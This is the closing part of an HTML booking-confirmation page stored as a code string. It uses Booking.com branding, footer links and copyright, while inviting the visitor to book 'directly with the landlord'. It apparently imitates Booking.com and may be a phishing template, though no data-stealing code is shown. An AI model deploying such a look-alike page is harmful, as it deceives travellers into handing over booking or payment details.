                            <label for="get_access">Get access to exclusive discounts tailored for you </label>
                        </div>
                        <span class="f-text">
                            By making this booking directly with the landlord, you agree to the booking conditions, general conditions and privacy statement.
                        </span>
                    </div>
                    <div class="f-confirm">
                        <button type="submit" class="f-button">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
                                <path d="M19.5 16.5V21.75C19.5 21.9489 19.421 22.1397 19.2803 22.2803C19.1397 22.421 18.9489 22.5 18.75 22.5H5.25C5.05109 22.5 4.86032 22.421 4.71967 22.2803C4.57902 22.1397 4.5 21.9489 4.5 21.75V11.25C4.5 11.0511 4.57902 10.8603 4.71967 10.7197C4.86032 10.579 5.05109 10.5 5.25 10.5H18.75C18.9489 10.5 19.1397 10.579 19.2803 10.7197C19.421 10.8603 19.5 11.0511 19.5 11.25V16.5ZM21 16.5V11.25C21 10.6533 20.7629 10.081 20.341 9.65901C19.919 9.23705 19.3467 9 18.75 9H5.25C4.65326 9 4.08097 9.23705 3.65901 9.65901C3.23705 10.081 3 10.6533 3 11.25V21.75C3 22.3467 3.23705 22.919 3.65901 23.341C4.08097 23.7629 4.65326 24 5.25 24H18.75C19.3467 24 19.919 23.7629 20.341 23.341C20.7629 22.919 21 22.3467 21 21.75V16.5ZM7.5 9.75V6C7.5 4.80653 7.97411 3.66193 8.81802 2.81802C9.66193 1.97411 10.8065 1.5 12 1.5C13.1935 1.5 14.3381 1.97411 15.182 2.81802C16.0259 3.66193 16.5 4.80653 16.5 6V9.75C16.5 9.94891 16.579 10.1397 16.7197 10.2803C16.8603 10.421 17.0511 10.5 17.25 10.5C17.4489 10.5 17.6397 10.421 17.7803 10.2803C17.921 10.1397 18 9.94891 18 9.75V6C18 4.4087 17.3679 2.88258 16.2426 1.75736C15.1174 0.632141 13.5913 0 12 0C10.4087 0 8.88258 0.632141 7.75736 1.75736C6.63214 2.88258 6 4.4087 6 6V9.75C6 9.94891 6.07902 10.1397 6.21967 10.2803C6.36032 10.421 6.55109 10.5 6.75 10.5C6.94891 10.5 7.13968 10.421 7.28033 10.2803C7.42098 10.1397 7.5 9.94891 7.5 9.75ZM12 15C11.7018 15.0005 11.416 15.1194 11.2054 15.3306C10.9949 15.5417 10.8767 15.8278 10.877 16.126C10.8773 16.4242 10.9959 16.7101 11.2069 16.9208C11.4178 17.1316 11.7038 17.25 12.002 17.25C12.3002 17.25 12.5862 17.1316 12.7971 16.9208C13.0081 16.7101 13.1267 16.4242 13.127 16.126C13.1273 15.8278 13.0091 15.5417 12.7986 15.3306C12.588 15.1194 12.3022 15.0005 12.004 15H11.998C11.7991 15.0005 11.6085 15.0801 11.4683 15.2211C11.328 15.3621 11.2495 15.5531 11.25 15.752C11.2505 15.9509 11.3301 16.1415 11.4711 16.2817C11.6121 16.422 11.8031 16.5005 12.002 16.5H12C11.9005 16.5 11.8052 16.4605 11.7348 16.3902C11.6645 16.3198 11.625 16.2245 11.625 16.125C11.625 16.0255 11.6645 15.9302 11.7348 15.8598C11.8052 15.7895 11.9005 15.75 12 15.75C12.0995 15.75 12.1948 15.7895 12.2652 15.8598C12.3355 15.9302 12.375 16.0255 12.375 16.125C12.375 16.2245 12.3355 16.3198 12.2652 16.3902C12.1948 16.4605 12.0995 16.5 12 16.5C12.1989 16.5 12.3897 16.421 12.5303 16.2803C12.671 16.1397 12.75 15.9489 12.75 15.75C12.75 15.5511 12.671 15.3603 12.5303 15.2197C12.3897 15.079 12.1989 15 12 15Z" fill="white"/>
                            </svg>
                            Complete Booking
                        </button>
                        <span class="f-assistive_text">Don\'t worry - you don\'t have to pay before check-in!</span>
                        <span class="f-assistive_text">What are the conditions for my booking?</span>
                    </div>
                </div>
            </form>
        </div>

        <footer class="f-footer">
            <ul class="f-list">
                <a href="https://www.booking.com/content/about.en-gb.html?label=gen173rf-1FCAEoggI46AdIM1gDaMIBiAEBmAEJuAEXyAEM2AEB6AEB-AEDiAIBogIMdHJha3N0YXQuY29tqAIDuAKMyriIBsACAdICJDE4N2M0MmJlLTA3N2UtNDBlNi04YWJiLTc3ODc4NjA1OGY3ZdgCBeACAQ;sid=5507e9052e396eb9c3664115d4751c61"><li class="f-list_element">About Booking.com</li></a>
                <a href="https://secure.booking.com/help.en-gb.html?label=gen173rf-1FCAEoggI46AdIM1gDaMIBiAEBmAEJuAEXyAEM2AEB6AEB-AEDiAIBogIMdHJha3N0YXQuY29tqAIDuAKMyriIBsACAdICJDE4N2M0MmJlLTA3N2UtNDBlNi04YWJiLTc3ODc4NjA1OGY3ZdgCBeACAQ&sid=5507e9052e396eb9c3664115d4751c61#/?source=footer_navigation"><li class="f-list_element">Client support</li></a>
                <a href="https://www.booking.com/content/terms.en-gb.html?label=gen173rf-1FCAEoggI46AdIM1gDaMIBiAEBmAEJuAEXyAEM2AEB6AEB-AEDiAIBogIMdHJha3N0YXQuY29tqAIDuAKMyriIBsACAdICJDE4N2M0MmJlLTA3N2UtNDBlNi04YWJiLTc3ODc4NjA1OGY3ZdgCBeACAQ;sid=5507e9052e396eb9c3664115d4751c61"><li class="f-list_element">Terms & Conditions</li></a>
                <a href="https://www.booking.com/content/privacy.en-gb.html?label=gen173rf-1FCAEoggI46AdIM1gDaMIBiAEBmAEJuAEXyAEM2AEB6AEB-AEDiAIBogIMdHJha3N0YXQuY29tqAIDuAKMyriIBsACAdICJDE4N2M0MmJlLTA3N2UtNDBlNi04YWJiLTc3ODc4NjA1OGY3ZdgCBeACAQ;sid=5507e9052e396eb9c3664115d4751c61"><li class="f-list_element">Privacy and Cookies</li></a>
            </ul>
            <span class="f-copyright">
                Copyright © 1996–2021 Booking.com. All rights reserved.
            </span>
        </footer>

         
        <div class="f-chat" id="open-support" style="z-index:999">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
                <path d="M21 11.5C21.0034 12.8199 20.6951 14.1219 20.1 15.3C19.3944 16.7118 18.3098 17.8992 16.9675 18.7293C15.6251 19.5594 14.0782 19.9994 12.5 20C11.1801 20.0035 9.87812 19.6951 8.7 19.1L3 21L4.9 15.3C4.30493 14.1219 3.99656 12.8199 4 11.5C4.00061 9.92179 4.44061 8.37488 5.27072 7.03258C6.10083 5.69028 7.28826 4.6056 8.7 3.90003C9.87812 3.30496 11.1801 2.99659 12.5 3.00003H13C15.0843 3.11502 17.053 3.99479 18.5291 5.47089C20.0052 6.94699 20.885 8.91568 21 11V11.5Z" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
        </div>

    </body>
    
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script> 
</html>';